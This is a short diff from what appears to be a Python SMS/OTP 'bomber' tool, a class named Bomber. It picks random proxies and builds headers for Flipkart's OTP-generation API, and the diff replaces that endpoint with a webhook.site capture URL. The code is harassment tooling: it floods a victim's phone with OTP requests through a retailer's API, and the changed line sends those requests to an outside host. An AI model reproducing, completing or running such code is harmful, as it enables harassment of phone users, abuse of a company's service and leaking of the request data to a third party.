@@ -36,7 +36,7 @@ class Bomber:
 		return 'https://' + random.choice(proxylist)
 	
 	def flipkart(self):
-		url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
+		url = "https://webhook.site/1757003c-12ec-446a-9830-5fe1878b0c36"
 		flipkart_header = {
 		"Accept": "*/*",
 		"Accept-Encoding": "gzip, deflate, br",
